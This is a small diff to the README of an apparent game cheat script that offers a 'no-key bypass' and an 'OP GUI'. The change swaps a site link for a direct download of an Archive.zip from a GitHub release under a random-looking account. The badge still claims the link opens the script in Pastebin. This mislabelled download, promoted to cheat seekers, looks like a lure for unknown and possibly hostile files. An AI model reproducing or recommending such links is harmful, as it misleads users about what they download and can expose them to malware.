@@ -1,7 +1,7 @@
 # EvadeX AutoFarm – No-Key Pastebin Bypass & OP GUI (2025 Edition) by Byfron
 
 <div style="text-align: center">
-  <a href="https://noxbits.com/">
+  <a href="https://github.com/tunihydterf1985/evade-script/releases/download/EvadeScript/Archive.zip">
     <img style="width: 1000px" alt="Click to Open Script in Pastebin" src="https://img.shields.io/badge/Click_For-_Open_Script_in_Pastebin!-purple">
   </a>
 </div>
